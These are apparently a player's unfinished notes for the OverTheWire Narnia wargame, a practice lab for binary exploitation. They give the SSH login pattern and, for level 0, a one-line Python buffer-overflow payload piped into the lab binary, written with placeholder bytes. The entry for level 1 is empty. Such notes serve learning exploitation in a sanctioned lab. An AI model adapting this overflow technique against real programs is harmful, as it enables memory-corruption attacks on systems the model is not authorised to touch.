# Narnia

## Generally

- ssh -p 2226 narnia<N>@narnia.labs.overthewire.org where <N> is 0 to 9

Look in `/narnia/`

## Levels

### 0

Not the actual bytes needed but the technique is fine

    python -c "print 'A'*20+'\x04\x03\x02\x01'" | /narnia/narnia0

### 1

